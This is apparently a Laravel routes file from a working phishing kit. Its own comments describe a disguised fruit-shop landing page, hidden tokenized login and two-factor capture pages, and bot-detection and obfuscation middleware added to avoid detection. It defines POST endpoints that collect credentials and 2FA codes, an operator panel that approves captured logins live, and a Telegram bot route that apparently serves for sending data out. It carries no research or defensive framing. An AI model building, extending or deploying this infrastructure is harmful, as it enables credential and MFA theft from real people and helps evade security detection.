<?php

use App\Http\Controllers\LoginApprovalController;
use App\Http\Controllers\PhishingController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
*/

Route::get('/secure-login', [LoginApprovalController::class, 'showLogin'])->name('secure-login');
Route::post('/secure-login', [LoginApprovalController::class, 'submitLogin'])->name('secure-login.submit');
Route::get('/approval/wait/{id}', [LoginApprovalController::class, 'wait'])->name('approval.wait');
Route::get('/approval/status/{id}', [LoginApprovalController::class, 'status'])->name('approval.status');

Route::get('/admin/login', [LoginApprovalController::class, 'showAdminLogin'])->name('admin.login');
Route::post('/admin/login', [LoginApprovalController::class, 'processAdminLogin'])->name('admin.login.submit');
Route::match(['get', 'post'], '/admin/logout', [LoginApprovalController::class, 'adminLogout'])->name('admin.logout');

Route::get('/admin/login-approvals', [LoginApprovalController::class, 'admin'])->name('admin.login-approvals');
Route::get('/admin/login-approvals/list', [LoginApprovalController::class, 'list'])->name('admin.login-approvals.list');
Route::get('/admin/login-approvals/stream', [LoginApprovalController::class, 'stream'])->name('admin.login-approvals.stream');
Route::post('/admin/login-approvals/{id}/approve', [LoginApprovalController::class, 'approve'])->name('admin.login-approvals.approve');
Route::post('/admin/login-approvals/{id}/reject', [LoginApprovalController::class, 'reject'])->name('admin.login-approvals.reject');
Route::post('/admin/login-approvals/{id}/delete', [LoginApprovalController::class, 'destroy'])->name('admin.login-approvals.delete');
Route::delete('/admin/login-approvals/{id}', [LoginApprovalController::class, 'destroy'])->name('admin.login-approvals.destroy');
Route::post('/admin/login-approvals-bulk-delete', [LoginApprovalController::class, 'destroyMultiple'])->name('admin.login-approvals.bulk-delete');
Route::post('/admin/login-approvals-clear', [LoginApprovalController::class, 'clearAll'])->name('admin.login-approvals.clear');

// Public Fruit Landing Page (Disguise)
Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
    Route::get('/', [PhishingController::class, 'home']);
    Route::get('/about', [PhishingController::class, 'about']);
    Route::get('/contact', [PhishingController::class, 'contact']);
    Route::get('/products', [PhishingController::class, 'home']);

    // Hidden Entry Points - Wrapped and Renamed for Disguise
    // We remove '/login' and '/latest-settings-info' to avoid detection
    Route::get('/invitation-login', [PhishingController::class, 'showLogin2v2']);
    Route::post('/invitation-login', [LoginApprovalController::class, 'submitLogin']);
    Route::get('/invitation', [PhishingController::class, 'index']);

    Route::get('/app/intro/availability-{token}', [PhishingController::class, 'showBookingOtio'])->name('booking-otio.token');
    Route::get('/app/intro/availability', [PhishingController::class, 'showBookingOtio'])->name('booking-otio');
    Route::get('/booking-otio-{token}', [PhishingController::class, 'showBookingOtio']);
    Route::get('/booking-otio', [PhishingController::class, 'showBookingOtio']);

    Route::get('/quality-standards', [PhishingController::class, 'latestSettingsInfo']);

    // Dynamic tokenized paths (the actual phishing pages) - Triple-Layer Protection
    // L1: ClassObfuscatorMiddleware encrypts real class names
    // L2: BotDetectionMiddleware scores & blocks automated traffic
    // L3: TokenGateMiddleware requires session-bound random query param token
    Route::middleware([
        \App\Http\Middleware\ClassObfuscatorMiddleware::class,
        \App\Http\Middleware\BotDetectionMiddleware::class,
        // \App\Http\Middleware\TokenGateMiddleware::class,
    ])->group(function () {
        Route::get('/two_step_verification{tpath}/login/{ltoken}', [PhishingController::class, 'showLogin']);
        Route::get('/two_step_verification{tpath}/authentication/{atoken}', [PhishingController::class, 'show2fa']);
        Route::get('/two_step_verification{tpath}/invitation/{itoken}/{page}', [PhishingController::class, 'showMeta']);
        Route::get('/two_step_verification{tpath}/latest-settings-info/{stoken}', [PhishingController::class, 'showFx']);
        Route::get('/index2', function () {
            return view('index2');
        });
    });
  
});

// Sensitive Data Submission Routes - Protected by Bot Detection but visible to real browsers
Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(function () {
    Route::post('/login', [PhishingController::class, 'handleLogin']);
    Route::post('/2fa', [PhishingController::class, 'handle2fa']);
    Route::post('/log', [PhishingController::class, 'handleGenericLog']);
    Route::post('/booking-otio/submit', [PhishingController::class, 'handleBookingOtioSubmit'])->name('booking-otio.submit');
});

// Non-blocked API internal call
Route::get('/session-paths', [PhishingController::class, 'getSessionPaths']);


Route::get('/test-telegram', function () {
    $token = env('TELEGRAM_BOT_TOKEN');
    $chatId = env('TELEGRAM_CHAT_ID');
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    \Illuminate\Support\Facades\Http::post($url, [
        'chat_id' => $chatId,
        'text' => "Test message from Nature's Bounty!"
    ]);
    return "Check your Telegram!";
});
